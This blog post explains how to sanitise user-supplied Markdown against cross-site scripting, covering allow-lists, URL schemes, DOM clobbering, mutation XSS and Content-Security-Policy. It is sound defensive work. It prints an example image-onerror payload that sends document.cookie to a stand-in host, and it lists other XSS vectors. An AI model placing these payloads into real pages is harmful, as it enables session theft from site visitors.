---
title: Markdown allows raw HTML, which means it allows scripts
description: Markdown renderers pass raw HTML straight through, so untrusted input needs a sanitiser: allow-lists, javascript: URLs, DOM clobbering and a CSP
date: 2026-08-21
tag: Safety
keywords: markdown xss, sanitize markdown, sanitize html, dompurify, markdown allow html, raw html in markdown, safe markdown rendering, user generated markdown, content security policy html
---

Markdown was designed to sit next to HTML, not to replace it. The original syntax rules pass HTML through untouched, and the parsers that follow them still do. Hand `marked` or Python-Markdown a `<script>` tag and you get a `<script>` tag back; `markdown-it` and remark do the same once raw HTML is turned on.

That is correct behaviour for a file out of your own repository. For a comment, a support ticket or a language model's output, it is a hole: something has to stand between the parser and the page.

## Raw HTML in Markdown is a feature, not an oversight

A payload need not look like one. This is valid Markdown:

```markdown
Thanks for the fix, this works now.

<img src=x onerror="fetch('https://elsewhere.invalid/?c='+document.cookie)">
```

The parser recognises a chunk of HTML and copies it to the output. Nothing is malformed, so nothing warns you.

Parsers used to try. `marked` had a `sanitize` option; it was deprecated, then removed, with the documentation pointing at a dedicated sanitiser instead. A half-written HTML filter inside a Markdown parser is worse than none: it reads like protection.

The simplest fix, when it fits: `markdown-it` leaves raw HTML off by default, so angle brackets come out escaped and visible. If your users have no reason to write HTML, leave it off — less code and fewer bugs than any allow-list. [Python-Markdown](/blog/markdown-to-html-in-python) has no such switch and always needs a sanitiser behind it.

## Allow-lists beat block-lists

A block-list names what is forbidden and fails the first time someone uses a tag nobody thought of. An allow-list names what a document may contain and drops the rest. It stays short, because Markdown's output is small: headings, paragraphs, lists, blockquotes, tables, code, emphasis, links, images, and an `<input>` for task lists. Attributes carry most of the damage.

| What arrives | What it does | The rule |
| --- | --- | --- |
| `<a href="javascript:...">` | Runs on click, no script tag needed | Allow `http`, `https`, `mailto`, relative |
| `<img src=x onerror=...>` | Fires when the image fails, which it will | Drop every attribute starting `on` |
| `<iframe srcdoc="...">` | Carries a whole document in an attribute | Drop `iframe`, `object`, `embed` |
| `<base href="//elsewhere">` | Repoints every relative URL | Drop it; set `base-uri 'none'` |

Schemes deserve care. Test the decoded value, not the raw string: `java&#9;script:` and `JaVaScRiPt:` are one URL to a browser and two strings to a naive check. Keep `data:` out of `href` too: browsers block a top-level `data:text/html` navigation, but that is their mitigation, not yours.

## DOM clobbering: an id that shadows a property

Every element with an `id` becomes a property on `window` under that name. An injected `<a id="config">` makes `window.config` an anchor element, so `if (!window.config) { window.config = defaults }` takes the wrong branch. No script ran; an attribute was enough.

Sanitisers cover less of this than their reputation suggests. DOMPurify's default check drops an `id` or `name` only when the value is already a property of a `Document` or an `HTMLFormElement`: `id="title"`, `id="body"`, `id="cookie"` and `id="action"` go, `id="config"` stays. `config` is a name your own code invented, and DOMPurify never looks at your globals. Full coverage is `SANITIZE_NAMED_PROPS: true`, off by default, which prefixes every `id` and `name` it keeps with `user-content-`. That prefix is the real defence — an id that cannot collide cannot clobber — and it has to cover both the ids that arrive in the document and the ids your renderer generates from headings. M2H sanitises with DOMPurify in the browser and the `xss` package on the server, against one shared allow-list, and prefixes every heading id with `doc-`: the same defence applied by hand.

## Sanitise after rendering, never before

Sanitising the source means guessing what the parser will do with it. Markdown has several spellings for the same output — reference links, backslash escapes, entities — and the parser invents markup that never appeared literally: an autolink becomes a full `<a href>` the source never contained. A filter on the source filters the wrong string. Sanitise what the renderer emitted, then stop touching it:

```js
import DOMPurify from 'dompurify';
import { marked } from 'marked';

const clean = DOMPurify.sanitize(marked.parse(userMarkdown), {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'code', 'pre', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href', 'title'],
});
```

A highlighter, a template, a regular expression rewriting anchors: anything after the sanitiser sits outside its guarantee.

## Mutation XSS: two parsers disagreeing

A sanitiser parses HTML into a tree, decides it is clean, and serialises it back to a string. The browser parses that string again. If the second parse yields a different tree, the check ran on a document nobody ships. That is mutation XSS: the bug belongs to neither parser, only to the disagreement. Watch where parsing rules change — foreign content such as `<svg>` and `<math>`, `<template>`, nesting that forces an implicit close tag, entities inside attributes.

The defences are dull: keep the sanitiser current, and never chain two, since whatever the last one emits is what ships. Server-side sanitising has a gap here — without a browser it brings its own parser, not the one your reader will use. Faking a DOM is worse: given nothing usable, DOMPurify returns its input unchanged instead of throwing. A narrow allow-list and a strict header are the mitigation.

## Safe Markdown rendering wants a Content-Security-Policy too

Assume your sanitiser has a bug. A CSP on the page that shows other people's documents turns a successful injection into a blocked one. If the page carries no scripts of its own, say so with `script-src 'none'`, add `frame-ancestors 'none'` so it cannot be framed as someone else's page, and set `base-uri 'none'`.

The trade-off: an app page running its own JavaScript cannot use `script-src 'none'`, which argues for rendering untrusted documents on a route of their own. A document [shared as a link](/blog/share-a-markdown-document-as-a-link) from M2H is served that way, and the file you download has no scripts at all.

Feed your own renderer the three inputs above: an `onerror` attribute, a `javascript:` link, and an `id` matching a global your code reads. If either of the first two reaches the page, you have a sanitiser to add and probably a header to set. The third will reach it, which is the point: check that it arrives under a prefix rather than under the name your code reads. [The JavaScript walkthrough](/blog/markdown-to-html-in-javascript) covers wiring `marked` and DOMPurify in the right order; M2H runs those two steps if you would rather not own the code.
